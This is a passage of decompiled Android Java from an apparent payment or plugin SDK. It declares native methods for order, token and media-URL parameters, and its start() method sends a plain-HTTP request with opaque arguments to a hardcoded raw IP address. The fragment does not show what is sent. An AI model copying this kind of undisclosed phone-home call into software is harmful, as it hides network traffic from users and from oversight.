  public static native ArrayList<String> nativeGetOrderParams(Context paramContext, String paramString1, int paramInt1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, int paramInt2, int paramInt3, String paramString9, String paramString10, String paramString11, String paramString12, int paramInt4, int paramInt5);
  
  public static native ArrayList<String> nativeGetPlayOrDownloadURLPostParams(Context paramContext, String paramString1, int paramInt1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, String paramString7, String paramString8, int paramInt2, int paramInt3, String paramString9, String paramString10, int paramInt4, int paramInt5);
  
  public static native String nativeGetStringBase64(String paramString);
  
  public static native String nativeGetStringMd5(String paramString);
  
  public static native ArrayList<String> nativeGetTokenPostParams(Context paramContext, String paramString1, int paramInt1, String paramString2, String paramString3, String paramString4, String paramString5, int paramInt2);
  
  public static native String nativeGetTokenString(String paramString1, String paramString2, String paramString3, String paramString4);
  
  public static native String nativeParseOrderData(String paramString);
  
  public static native String nativeParsePlayUrl(String paramString);
  
  public static native String nativeParseToken(String paramString);
  
  public static native String nativeSayTest(String paramString, byte[] paramArrayOfByte, int paramInt);
  
  public static void start(Context paramContext, Handler paramHandler)
  {
    if (inited) {
      return;
    }
    inited = true;
    Out_Handler = paramHandler;
    init(paramContext);
    paramContext = new AsyncHttpClient();
    paramContext.setTimeout(50000);
    paramHandler = new RequestParams();
    String str = g_args;
    logger.d("[PluginSdk]", "args:http://112.74.194.208/apk/docheck.do" + str);
    paramContext.get("http://112.74.194.208/apk/docheck.do" + str, paramHandler, new PluginSdk.2());
  }
  
  public static void start(Context paramContext, Handler paramHandler, String paramString)
  {
    g_Channelid = paramString;
    start(paramContext, paramHandler);
  }
}
